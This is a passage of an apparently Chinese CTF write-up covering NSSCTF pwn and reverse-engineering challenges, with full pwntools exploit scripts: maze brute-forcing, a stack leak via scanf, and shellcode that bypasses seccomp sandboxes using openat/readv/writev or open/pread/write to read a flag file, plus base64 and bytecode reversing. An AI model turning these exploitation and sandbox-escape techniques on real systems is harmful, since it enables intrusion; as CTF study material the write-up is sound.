1010</span></span><br><span class="line"><span class="comment"># 0x1145162a</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;have?&#x27;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(to_vuln_offset))</span><br><span class="line"></span><br><span class="line"><span class="comment">#payload = b&#x27;a&#x27;*0x28 + p64(backdoor)</span></span><br><span class="line"><span class="comment">#io.recvuntil(b&#x27;bottle&#x27;)</span></span><br><span class="line"><span class="comment">#io.sendline(payload)</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="Pwn-xenny的诱惑"><a href="#Pwn-xenny的诱惑" class="headerlink" title="Pwn-xenny的诱惑"></a>Pwn-xenny的诱惑</h2><p>远程会发来一大段数据，拿去base64解出来一个ELF文件</p><p><em><strong>文件：</strong></em><a href="../resources/pwn_asset/2023-8/xenny_map" target="_block">xenny_map</a></p><p>需要先走一段迷宫，然后orw</p><h3 id="迷宫思路："><a href="#迷宫思路：" class="headerlink" title="迷宫思路："></a>迷宫思路：</h3><blockquote><p>  <strong>概况：</strong></p><p>  迷宫太大了，而且每个路口（姑且这么说，1000个函数当作1000个路口），都连通10个路口（对应输入的1-10），如果都不是就回到开始的main（步数，也就是文件里的tmp不会置零，也会+1），要保证刚好第1000步找到xenny。</p></blockquote><p>我懒得分析如何走迷宫了，选择直接随机数爆破：），效果还不错</p><p>本地就先每次启动一个程序，然后设置seed，把走过的每一步都放在一个数组里（我叫做step_arr），然后先走到xenny那里<del>（没到1000步，当然不在）</del>，然后一直发<code>b&#39;\n&#39;</code>，就是一直回到main（发其他的也行，这个阶段就随便乱走，反正本地跑的快，不至于会alarm clock），最后留出来一定步数，再重新跑一遍step_arr（凑够1000次）</p><p><strong>本地：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">sd = <span class="number">1</span></span><br><span class="line">step = <span class="number">0</span></span><br><span class="line">step_arr = []</span><br><span class="line"><span class="comment">#io.recvuntil(b&quot;That&#x27;s all\n&quot;)</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment"># io = process([&#x27;seccomp-tools&#x27;, &#x27;dump&#x27;, &#x27;./map&#x27;])</span></span><br><span class="line">    io = process(<span class="string">&#x27;./map&#x27;</span>)</span><br><span class="line">    random.seed(sd)</span><br><span class="line">    <span class="keyword">while</span> <span class="string">b&#x27;xenny&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> io.recvline() <span class="keyword">and</span> step &lt; <span class="number">500</span>:</span><br><span class="line">        choice = random.randint(<span class="number">1</span>, <span class="number">10</span>)</span><br><span class="line">        io.sendline(<span class="built_in">str</span>(choice))</span><br><span class="line">        step += <span class="number">1</span></span><br><span class="line">        step_arr.append(choice)</span><br><span class="line">    log.info(<span class="string">&#x27;step: %d&#x27;</span> % step)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(step_arr) == <span class="number">500</span>:</span><br><span class="line">        sd += <span class="number">1</span></span><br><span class="line">        step = <span class="number">0</span></span><br><span class="line">        step_arr = []</span><br><span class="line">        io.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;step_arr: &#x27;</span>, step_arr)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;seed:&#x27;</span>, sd)</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">len_step_arr = <span class="built_in">len</span>(step_arr)</span><br><span class="line">log.info(<span class="string">&#x27;len_step_arr: %d&#x27;</span> % len_step_arr)</span><br><span class="line"><span class="built_in">print</span>(step_arr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span> - <span class="number">2</span> * len_step_arr):</span><br><span class="line">    io.recvline()</span><br><span class="line">    io.sendline(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> step_arr:</span><br><span class="line">    io.recvline()</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(i))</span><br></pre></td></tr></table></figure><p>要注意的是：<strong>因为要跑2次step_arr，那么这个数组长度不能超过500，所以500后我就重启了程序，（重启记得初始化变量）</strong></p><p><strong>远程：</strong></p><p>远程也差不多这样，不过考虑到有alarm（0x15），测试大概只能收发100多次，所以把临界值改成了150</p><p><code>while b&#39;xenny&#39; not in io.recvline() and step &lt; 150:</code></p><p><code>if len(step_arr) == 150:</code></p><p>在探完路后（搞出来step_arr了），建议一直发非1-10的，触发default返回main，这样可以刷新alarm（）</p><h3 id="沙箱思路："><a href="#沙箱思路：" class="headerlink" title="沙箱思路："></a>沙箱思路：</h3><img src="/2023-8%E4%B8%8B%E5%8D%8A%E6%9C%88%E6%AF%94%E8%B5%9Bwp/sandbox.png" alt="sandbox"><p>可以看到禁了read，write，open，先试了一下直接execve，打不通，应该是执行execve过程中触发了沙箱的某个限制，这里考虑<strong>使用openat，readv，writev函数来拿到flag</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">openat</span><span class="params">(<span class="type">int</span>  dirfd , <span class="type">const</span> <span class="type">char</span> * pathname , <span class="type">int</span>  flags , ... <span class="comment">/* mode_t  mode */</span>)</span>;</span><br></pre></td></tr></table></figure><blockquote><p>  总结起来，如果<code>pathname</code>是绝对路径，则<code>dirfd</code>参数没用。如果<code>pathname</code>是相对路径，并且<code>dirfd</code>的值不是<code>AT_FDCWD</code>，则<code>pathname</code>的参照物是相对于<code>dirfd</code>指向的目录，而不是进程的当前工作目录；反之，如果<code>dirfd</code>的值是<code>AT_FDCWD</code>，<code>pathname</code>则是相对于进程当前工作目录的相对路径，此时等同于<code>open</code></p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 功能：将数据从文件描述符读到分散的内存块中，即分散读</span></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">readv</span><span class="params">(<span class="type">int</span> fd, <span class="type">const</span> <span class="keyword">struct</span> iovec *iov, <span class="type">int</span> iovcnt)</span>;</span><br><span class="line"><span class="comment">// 功能：将多块分散的内存数据一并写入文件描述符中，即集中写</span></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">writev</span><span class="params">(<span class="type">int</span> fd, <span class="type">const</span> <span class="keyword">struct</span> iovec *iov, <span class="type">int</span> iovcnt)</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> &#123;</span></span><br><span class="line">    <span class="type">void</span>  *iov_base;    <span class="comment">/* 缓冲区首地址 */</span></span><br><span class="line">    <span class="type">size_t</span> iov_len;     <span class="comment">/*缓冲区长度 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>  readv（）系统调用将从fd读入的数据按一定顺序散布到多个缓冲区，readv会先填满一个再填充下一个</p><p>  writev（）会按顺序，从各个缓冲区中聚集输出数据到fd</p></blockquote><p>程序在0x10000到0x11000有wx权限，不妨直接写在这上面</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload = asm(shellcraft.openat(<span class="number">0</span>, <span class="string">b&quot;/flag&quot;</span>, <span class="number">0</span>))</span><br><span class="line">payload += asm(shellcraft.readv(<span class="number">3</span>, <span class="number">0x10100</span>, <span class="number">1</span>))</span><br><span class="line">payload += asm(shellcraft.writev(<span class="number">1</span>, <span class="number">0x10100</span>, <span class="number">1</span>))</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x90&#x27;</span>)</span><br><span class="line">payload += p64(<span class="number">0x10700</span>) + p64(<span class="number">0x40</span>) <span class="comment"># readv和writev的iov都指向这里，这里起始地址和大小可以随意设置</span></span><br><span class="line">payload += asm(shellcraft.exit(<span class="number">0</span>))</span><br></pre></td></tr></table></figure><p>readv和writev的第二个参数是结构体指针，这里指向0x10100，然后我们在0x10100的位置伪造一个结构体；第三个参数设置1是因为我们只需要一块缓冲区就够了。</p><h3 id="完整exp（远程）："><a href="#完整exp（远程）：" class="headerlink" title="完整exp（远程）："></a>完整exp（远程）：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#io = remote(&#x27;node5.anna.nssctf.cn&#x27;, 28397)</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#random.seed(0)</span></span><br><span class="line">step = <span class="number">0</span></span><br><span class="line">step_arr = []</span><br><span class="line">sd = <span class="number">0</span></span><br><span class="line"><span class="comment"># payload提前放在这里是因为编译要时间，放在后门可能会alarm clock(问就是被迫多跑了一遍，远程真TM慢)</span></span><br><span class="line">payload = asm(shellcraft.openat(<span class="number">0</span>, <span class="string">b&quot;/flag&quot;</span>, <span class="number">0</span>))<span class="comment"># 建议写绝对地址，理由看上面openat那里</span></span><br><span class="line">payload += asm(shellcraft.readv(<span class="number">3</span>, <span class="number">0x10100</span>, <span class="number">1</span>))</span><br><span class="line">payload += asm(shellcraft.writev(<span class="number">1</span>, <span class="number">0x10100</span>, <span class="number">1</span>))</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x90&#x27;</span>)</span><br><span class="line">payload += p64(<span class="number">0x10700</span>) + p64(<span class="number">0x40</span>)</span><br><span class="line">payload += asm(shellcraft.exit(<span class="number">0</span>))</span><br><span class="line"><span class="comment"># 发现每次连接迷宫都不一样，所以不能用本地跑出来的路线来跑，要重新探路</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    io = remote(<span class="string">&#x27;node5.anna.nssctf.cn&#x27;</span>, <span class="number">28821</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;That&#x27;s all\n&quot;</span>)</span><br><span class="line">    random.seed(sd)</span><br><span class="line">    <span class="keyword">while</span> <span class="string">b&#x27;xenny&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> io.recvline() <span class="keyword">and</span> step &lt; <span class="number">150</span>:</span><br><span class="line">        choice = random.randint(<span class="number">1</span>, <span class="number">10</span>)</span><br><span class="line">        io.sendline(<span class="built_in">str</span>(choice))</span><br><span class="line">        step += <span class="number">1</span></span><br><span class="line">        step_arr.append(choice)</span><br><span class="line">        log.info(<span class="string">&#x27;step: %d&#x27;</span> % step)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(step_arr) == <span class="number">150</span>:</span><br><span class="line">        sd += <span class="number">1</span></span><br><span class="line">        step = <span class="number">0</span></span><br><span class="line">        step_arr = []</span><br><span class="line">        io.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;step_arr: &#x27;</span>, step_arr)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;seed:&#x27;</span>, sd)</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span> - <span class="number">2</span> * <span class="built_in">len</span>(step_arr)):</span><br><span class="line">    io.recvline()</span><br><span class="line">    io.sendline(<span class="string">b&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> step_arr:</span><br><span class="line">    io.recvline()</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line">res = io.recvuntil(<span class="string">b&quot;don&#x27;t forget your flag\n&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="Pwn-happy2"><a href="#Pwn-happy2" class="headerlink" title="Pwn-happy2"></a>Pwn-happy2</h2><p><em><strong>附件：</strong></em><a href="../resources/pwn_asset/2023-8/happy2" target="_block">happy2</a></p><img src="/2023-8%E4%B8%8B%E5%8D%8A%E6%9C%88%E6%AF%94%E8%B5%9Bwp/happy2_proof.png" alt="happy2_proof" style="zoom:80%;"><p>要绕过最后的一个判断，显然是要通过前面的printf泄露puts的地址</p><p>可以利用scanf在读取非数字字符时，不会返回值的特性，这里输入’+’号，就可以泄露栈中的数据了，动调发现第二个数据是stderr的地址，所以泄露stderr地址，再根据stderr和puts的偏移算出puts地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">io.recvuntil(<span class="string">b&#x27;konw\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;+&#x27;</span>)</span><br><span class="line">io.recv(<span class="number">1</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;+&#x27;</span>)</span><br><span class="line">stderr = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&#x27;you&#x27;</span>, drop=<span class="literal">True</span>))</span><br><span class="line">exit_addr = stderr - <span class="number">0x1997d0</span><span class="comment"># 这里只算了本机的偏移，远程应该不同</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;have a try\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(exit_addr).encode())</span><br></pre></td></tr></table></figure><p>然后main里的思路是orw</p><img src="/2023-8%E4%B8%8B%E5%8D%8A%E6%9C%88%E6%AF%94%E8%B5%9Bwp/happy2_main.png" alt="happy2_main" style="zoom: 80%;"><p>用seccomp-tools dump一下，ban了execve，fork，connect，read（据说附件给错了，原本要ban的是readv），所以这里就用open，pread，write来拿到flag（思路和上一题差不多，不细讲了）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">payload = asm(shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>))</span><br><span class="line">payload += asm(shellcraft.pread(<span class="number">3</span>, <span class="number">0x10100</span>, <span class="number">0x30</span>, <span class="number">0</span>))</span><br><span class="line">payload += asm(shellcraft.write(<span class="number">1</span>, <span class="number">0x10100</span>, <span class="number">0x30</span>))</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x90&#x27;</span>)</span><br><span class="line">payload += p64(<span class="number">0x10400</span>)</span><br><span class="line">io.sendline(payload)</span><br></pre></td></tr></table></figure><h2 id="Re-MyBase"><a href="#Re-MyBase" class="headerlink" title="Re-MyBase"></a>Re-MyBase</h2><p><em><strong>附件：</strong></em><a href="../resources/pwn_asset/2023-8/myBase.exe" target="_block">myBase.exe</a></p><h3 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h3><p>换表base64，发现每次base加密都利用随机数重新生成了一个新表，这里可以直接复刻代码逻辑用ctype来复原用过的表。</p><p>我这里是直接动调把表扒下来</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp:"></a>exp:</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">CLASSIC_TABLE = <span class="string">b&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">b64decode</span>(<span class="params">enc: <span class="built_in">str</span>|<span class="built_in">bytes</span>, key: <span class="built_in">str</span>|<span class="built_in">bytes</span> = CLASSIC_TABLE</span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(enc, <span class="built_in">str</span>):</span><br><span class="line">        enc = enc.encode()</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(key, <span class="built_in">str</span>):</span><br><span class="line">        key = key.encode()</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(key) == <span class="number">65</span>:</span><br><span class="line">        padding = key[-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">len</span>(key) == <span class="number">64</span>:</span><br><span class="line">        padding = (<span class="built_in">set</span>(CLASSIC_TABLE) - <span class="built_in">set</span>(key)).pop()</span><br><span class="line">        key += <span class="built_in">bytes</span>([padding])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;Invalid key length&quot;</span>)</span><br><span class="line">    msg = []</span><br><span class="line">    l = <span class="built_in">len</span>(enc)</span><br><span class="line">    <span class="keyword">if</span> l % <span class="number">4</span> != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;Invalid base64code length&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, l, <span class="number">4</span>):</span><br><span class="line">        buf = key.index(enc[i]) &lt;&lt; <span class="number">18</span> | key.index(enc[i+<span class="number">1</span>]) &lt;&lt; <span class="number">12</span> | key.index(enc[i+<span class="number">2</span>]) &lt;&lt; <span class="number">6</span> | key.index(enc[i+<span class="number">3</span>])</span><br><span class="line">        msg.append(buf &gt;&gt; <span class="number">16</span>)</span><br><span class="line">        msg.append((buf &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>)</span><br><span class="line">        msg.append(buf &amp; <span class="number">0xff</span>)</span><br><span class="line">    <span class="keyword">if</span> enc[-<span class="number">1</span>] == padding:</span><br><span class="line">        msg.pop()</span><br><span class="line">        <span class="keyword">if</span> enc[-<span class="number">2</span>] == padding:</span><br><span class="line">            msg.pop()</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(msg)</span><br><span class="line"></span><br><span class="line">enc = <span class="string">b&#x27;YkLYv1Xj23X7N0E5eoFgUveKeos1XS8K9r4g&#x27;</span></span><br><span class="line">key = [</span><br><span class="line">    <span class="string">&#x27;+86420ywusqomkigecaYWUSQOMKIGECABDFHJLNPRTVXZbdfhjlnprtvxz13579/&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;YsVO0tvT2o4puZ38j1dwf7MArGPNeQLDRHUK+SChbFanmklWEcgixXJIq6y5B/9z=&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;xDfpNE4LYH5Tk+MRtrlv1oFbQm0gP37eqIajh2syUnZcSV8iBK6O/XWuzdCwA9GJ=&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;YvHeOZECmTyg0Mw2i7PIGKblsfF59rzUk6p3hVdW1qaQ+xRANnXLj48BcJDotS/u=&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;xDfpNE4LYH5Tk+MRtrlv1oFbQm0gP37eqIajh2syUnZcSV8iBK6O/XWuzdCwA9GJ=&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;YvHeOZECmTyg0Mw2i7PIGKblsfF59rzUk6p3hVdW1qaQ+xRANnXLj48BcJDotS/u=&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;xDfpNE4LYH5Tk+MRtrlv1oFbQm0gP37eqIajh2syUnZcSV8iBK6O/XWuzdCwA9GJ=&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;YvHeOZECmTyg0Mw2i7PIGKblsfF59rzUk6p3hVdW1qaQ+xRANnXLj48BcJDotS/u=&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;xDfpNE4LYH5Tk+MRtrlv1oFbQm0gP37eqIajh2syUnZcSV8iBK6O/XWuzdCwA9GJ=&#x27;</span>,</span><br><span class="line">    ]</span><br><span class="line">flag = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> key:</span><br><span class="line">    <span class="comment"># 没有细看文件中的base64encode代码，在动调过程中发现加密生成的字符串顺序是反的，所以这里反过来再传参</span></span><br><span class="line">    flag += b64decode(enc[i*<span class="number">4</span>:i*<span class="number">4</span>+<span class="number">4</span>][::-<span class="number">1</span>], k)</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># NSSCTF&#123;Welc0me_T0_Re_World&#125;</span></span><br></pre></td></tr></table></figure><h2 id="Re-Bytecode"><a href="#Re-Bytecode" class="headerlink" title="Re-Bytecode"></a>Re-Bytecode</h2><p><em><strong>附件：</strong></em><a href="../resources/pwn_asset/2023-8/Bytecode.txt" target="_block">Bytecode.txt</a></p><p><em>字节码，直接手搓！！！</em></p><h3 id="复原代码："><a href="#复原代码：" class="headerlink" title="复原代码："></a>复原代码：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">key</span>):</span><br><span class="line">    x = [<span class="number">78</span>, <span class="number">82</span>, <span class="number">81</span>, <span class="number">64</span>, <span class="number">80</span>, <span class="number">67</span>, <span class="number">125</span>, <span class="number">83</span>, <span class="number">96</span>, <span class="number">56</span>, <span class="number">121</span>, <span class="number">84</span>, <span class="number">61</span>, <span class="number">126</span>, <span class="number">81</span>, <span class="number">79</span>, <span class="number">79</span>, <span class="number">119</span>, <span class="number">38</span>, <span class="number">120</span>, <span class="number">39</span>, <span class="number">74</span>, <span class="number">112</span>, <span class="number">38</span>, <span class="number">44</span>, <span class="number">126</span>, <span class="number">103</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(key) != <span class="built_in">len</span>(x):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;wrong length!&#x27;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(key)):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">ord</span>(key[i]) ^ i != x[i]:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init</span>(<span class="params">key</span>):</span><br><span class="line">    s_box = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + s_box[i] + <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])) % <span class="number">256</span></span><br><span class="line">    s_box[j], s_box[i] = s_box[i], s_box[j]</span><br><span class="line">    <span class="keyword">return</span> s_box</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fun</span>(<span class="params">msg</span>):</span><br><span class="line">    key = <span class="string">&quot;Just kidding, don&#x27;t take it personally!&quot;</span></span><br><span class="line">    x = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(msg)):</span><br><span class="line">        x.append(<span class="built_in">ord</span>(msg[i]) ^ <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)]))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x)):</span><br><span class="line">        x[i] = (x[i] ^ i) &gt;&gt; <span class="number">3</span></span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt1</span>(<span class="params">msg, s_box</span>):</span><br><span class="line">    x = []</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span 